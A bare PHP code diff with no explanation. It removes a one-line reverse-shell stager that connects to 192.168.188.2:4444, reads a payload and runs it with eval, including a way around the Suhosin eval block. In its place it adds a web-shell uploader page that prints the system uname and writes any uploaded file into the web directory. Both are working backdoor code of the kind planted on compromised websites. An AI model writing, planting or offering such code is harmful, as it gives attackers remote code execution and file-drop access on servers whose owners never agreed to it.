@@ -1,1 +1,26 @@
-/*<?php /**/ error_reporting(0); $ip = '192.168.188.2'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
+<?php
+
+error_reporting(0);
+set_time_limit(0);
+
+
+echo "<center><b>Uname:".php_uname()."<br></b>"; 
+echo '<font color="black" size="4">';
+if(isset($_POST['Submit'])){
+    $filedir = ""; 
+    $maxfile = '2000000';
+    $mode = '0644';
+    $userfile_name = $_FILES['image']['name'];
+    $userfile_tmp = $_FILES['image']['tmp_name'];
+    if(isset($_FILES['image']['name'])) {
+        $qx = $filedir.$userfile_name;
+        @move_uploaded_file($userfile_tmp, $qx);
+        @chmod ($qx, octdec($mode));
+	echo" <a href=$userfile_name><center><b>Sucessfully Uploaded :D ==> $userfile_name</b></center></a>";
+	}
+}else{
+	echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
+}
+echo '</center></font>';
+
+?>
